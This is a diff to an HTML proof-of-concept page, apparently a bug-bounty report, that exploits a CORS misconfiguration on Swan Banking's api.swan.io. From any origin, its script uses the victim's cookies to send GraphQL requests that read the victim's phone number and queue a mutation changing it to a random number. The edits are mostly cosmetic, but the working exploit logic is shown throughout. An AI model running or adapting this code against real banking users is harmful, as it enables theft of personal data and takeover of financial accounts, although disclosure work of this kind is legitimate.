@@ -5,17 +5,19 @@
   body { font-family: system-ui; margin: 2rem; color: #111 }
   pre  { background: #f8f8f8; padding: 1rem; border: 1px solid #e1e1e1; overflow: auto }
   code { color: #c7254e; background: #f9f2f4 }
+  .success { color: green }
+  .error   { color: red }
 </style>
 
 <h2>⚠️ Swan Banking – Critical CORS Misconfiguration PoC ⚠️</h2>
 <p>This page is served from <strong id="origin"></strong>.  
 All requests below run <em>automatically</em> with your <code>api.swan.io</code> cookies  
-(no JWT, no custom header)</p>
+(no JWT, no custom header).</p>
 
 <pre id="log">Running…</pre>
 
 <script>
-  const log = l => document.getElementById('log').textContent += l + '\n';
+  const log = line => document.getElementById('log').textContent += line + '\n';
   document.getElementById('origin').textContent = location.origin;
 
   async function gql(path, query) {
@@ -38,15 +40,15 @@ All requests below run <em>automatically</em> with your <code>api.swan.io</code>
       oldN = whoami.data.user.mobilePhoneNumber;
       log(`✅ Read victim’s phone: ${oldN}\n`);
     } else {
-      log(`⚠️ Could not read phone (no cookie) – using dummy: ${oldN}\n`);
+      log(`⚠️ Could not read phone (unauthenticated)—using dummy: ${oldN}\n`);
     }
 
     // 2) Generate a valid new number: +33 6XXXXXXXX (8 digits)
-    const rand8 = () => Math.floor(10_000_000 + Math.random() * 90_000_000);
-    const newN  = '+336' + String(rand8()).slice(1);
-    log(`▶ Changing from ${oldN} → ${newN}\n`);
+    const rand8 = () => Math.floor(10_000_000 + Math.random() * 90_000_000).toString();
+    const newN  = '+33' + '6' + rand8();
+    log(`▶ Attempting change from ${oldN} → ${newN}\n`);
 
-    // 3) Queue phone-change mutation
+    // 3) Queue the phone-change mutation
     const mut = `
       mutation {
         startPhoneNumberModification(input:{
